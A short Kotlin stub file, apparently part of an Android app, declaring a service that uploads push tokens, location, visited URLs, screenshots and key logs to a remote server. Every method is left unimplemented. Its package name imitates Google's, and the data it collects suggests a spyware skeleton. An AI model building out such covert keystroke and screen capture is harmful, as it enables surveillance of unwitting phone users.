package com.android.google.remote

import com.android.google.remote.models.*

/*
* Here with Retrofit2 - Manager sending data to the remote server
* */

class ServerService: RemoteService {

    override suspend fun sendPushToken(token: PushTokenDTO) {
        TODO("Not yet implemented")
    }

    override suspend fun sendLocation(location: LocationDTO) {
        TODO("Not yet implemented")
    }

    override suspend fun sendUrl(urlDTO: UrlDTO) {
        TODO("Not yet implemented")
    }

    override suspend fun sendScreenshot(screenshotDTO: ScreenshotDTO) {
        TODO("Not yet implemented")
    }

    override suspend fun sendKeyLog(keyLog: KeyLogDTO) {
        TODO("Not yet implemented")
    }

}